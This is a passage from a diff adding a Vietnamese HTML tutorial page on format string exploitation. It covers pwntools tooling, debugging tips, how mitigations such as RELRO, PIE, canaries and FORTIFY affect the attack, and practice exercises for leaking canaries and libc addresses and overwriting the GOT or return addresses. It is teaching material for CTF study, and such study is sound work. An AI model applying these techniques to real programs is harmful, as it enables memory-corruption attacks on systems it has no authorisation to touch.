+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Offset lệch do độ dài prefix</h4><p>Địa chỉ đặt ở cuối payload phải căn 8 byte &amp; rơi đúng ô. fmtstr_payload tự lo.</p></div></div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">pwntools fmtstr_payload</div><h4>Dựng payload ghi</h4><p>Chia %hhn tự động.</p></div>
+    <div class="card"><div class="term">pwntools FmtStr</div><h4>Dò offset + ghi</h4><p>Tự động hóa khi gọi được nhiều lần.</p></div>
+    <div class="card"><div class="term">pwnld fmtstr_pos</div><h4>Offset nhanh</h4><p>Trả vị trí buffer.</p></div>
+    <div class="card"><div class="term">gdb</div><h4>Soi stack</h4><p>Xem ô nào là buffer/canary/libc.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi fmtstr không ăn</h2>
+  <div class="grid">
+    <div class="card"><h4>Offset sai</h4><p>%N$p không ra chuỗi của mình. Dò lại 1→30. Chú ý prefix làm lệch.</p></div>
+    <div class="card"><h4>Ghi GOT crash (Full RELRO)</h4><p>Đổi đích ret-addr/exit handler/hook.</p></div>
+    <div class="card"><h4>%s crash</h4><p>Con trỏ đối số không hợp lệ → deref lỗi. Tránh %s khi chưa chắc.</p></div>
+    <div class="card"><h4>%n bị cấm (FORTIFY)</h4><p><code>_FORTIFY_SOURCE</code> chặn %n trong writable fmt. Chỉ leak được, không ghi %n.</p></div>
+    <div class="card"><h4>In quá nhiều treo</h4><p>%Nc với N khổng lồ. Ghi từng byte %hhn, thứ tự tăng dần.</p></div>
+    <div class="card"><h4>Địa chỉ chứa null</h4><p>Null byte cắt chuỗi (nếu đọc bằng scanf %s). Đặt địa chỉ ở CUỐI payload.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / BIẾN THỂ & KIẾN TRÚC</div>
+  <h2>x86 vs x86-64, mitigations</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Khía cạnh</th><th>x86-64</th><th>x86 (32-bit)</th></tr></thead>
+    <tbody>
+      <tr><td>Đối số đầu</td><td>5 reg (rsi…r9) rồi stack</td><td>TẤT CẢ trên stack ngay → offset nhỏ hơn, buffer thường %4–%7</td></tr>
+      <tr><td>Ghi địa chỉ</td><td>8 byte = 8× %hhn</td><td>4 byte = 4× %hhn</td></tr>
+      <tr><td>Null trong địa chỉ</td><td>0x00007f... có null</td><td>0x0804... có null cao</td></tr>
+    </tbody>
+  </table></div>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Mitigation</th><th>Ảnh hưởng</th></tr></thead>
+    <tbody>
+      <tr><td>Canary</td><td>Không cản fmtstr (ghi GOT/ret không chạm canary); còn LEAK được canary.</td></tr>
+      <tr><td>PIE</td><td>Phải leak ELF base trước khi ghi GOT. fmtstr leak được.</td></tr>
+      <tr><td>Full RELRO</td><td>GOT read-only → đổi đích exit handler/ret-addr/hook.</td></tr>
+      <tr><td>FORTIFY (_FORTIFY_SOURCE≥1)</td><td>%n trong writable fmt bị abort → chỉ còn leak.</td></tr>
+    </tbody>
+  </table></div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐ · Leak</div><p>printf(buf) 1 lần: dò offset, leak canary + libc bằng %N$p.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐ · Ghi GOT</div><p>printf nhiều lần, Partial RELRO: fmtstr_payload ghi GOT printf = win.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐ · Full RELRO + PIE</div><p>Leak PIE+libc, rồi ghi return address = one_gadget (fmtstr_payload tới ret-addr đã leak).</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">format string bug</div><p>printf(buf) với buf là input.</p></div>
+    <div class="card"><div class="term">offset</div><p>Vị trí %N$ trúng buffer.</p></div>
+    <div class="card"><div class="term">%n / %hhn</div><p>Ghi 4/1 byte = số đã in.</p></div>
+    <div class="card"><div class="term">%N$p</div><p>Direct param: đọc đối số thứ N.</p></div>
+    <div class="card"><div class="term">fmtstr_payload</div><p>pwntools dựng payload ghi.</p></div>
+    <div class="card"><div class="term">FORTIFY</div><p>_FORTIFY_SOURCE chặn %n writable.</p></div>
+    <div class="card"><div class="term">Full RELRO</div><p>GOT read-only → đổi đích.</p></div>
+    <div class="card"><div class="term">one-shot</div><p>Leak+ghi trong 1 payload.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Tiếp: <a href="exit_handlers.html">exit_handlers</a> (đích khi Full RELRO). Liên quan: <a href="canary.html">canary</a> (leak), <a href="ret2libc.html">ret2libc</a> (sau khi ghi ret).</li>
+    <li>pwntools <code>fmtstr</code> docs · "Exploiting Format String Vulnerabilities" (scut/team teso).</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 3 · Bài 16.</strong> printf(buf) → %p đọc (leak canary/libc/PIE, dò offset), %n ghi (fmtstr_payload chia %hhn). Full RELRO → đổi đích ret/exit handler. Tiếp theo: exit handlers.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("fmt-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("fmt-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  // stack reader sim
+  var reg=[["%1$","rsi","0x00007fffffffe0a0  (con trỏ stack)"],
+           ["%2$","rdx","0x00007ffff7fb5190  (libc data)"],
+           ["%3$","rcx","0x0000000000000001"],
+           ["%4$","r8", "0x00007ffff7fac887  (libc)"],
+           ["%5$","r9", "0x0000000000000000  (nil)"]];
+  var stk=[["%6$","[rsp]",    "0x4847464544434241  (\"ABCDEFGH\" ← BUFFER!)", true],
+           ["%7$","[rsp+8]",  "0x0000000000000000  (phần buf còn lại)"],
+           ["%8$","[rsp+16]", "0x00007fffffffe200  (stack)"],
+           ["%9$","[rsp+24]", "0x0000000000000000"],
+           ["%10$","[rsp+32]","0x0000555555555080  (ret / PIE)"],
+           ["%11$","[rsp+40]","0x6a3b9f2c1e4d0000  (CANARY, cuối 00)"],
+           ["%21$","[rsp+..]","0x00007ffff7dcf083  (__libc_start_main+243)"]];
+  var nIn=document.getElementById("nIn"),rows=document.getElementById("rows");
+  function render(){
+    var n=parseInt((nIn.value||"").trim(),10);
+    var all=reg.concat(stk);
+    rows.innerHTML=all.map(function(a){
+      var num=parseInt(a[0].replace(/[^0-9]/g,""),10);
+      var hit = (num===n);
+      return '<div class="r'+(hit?' hit':'')+'"><span class="pos">'+a[0]+'p</span><span>'+a[1]+'</span><span>'+a[2]+(a[3]?'':'')+'</span></div>';
+    }).join("");
+  }
+  nIn.addEventListener("input",render);render();
+
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
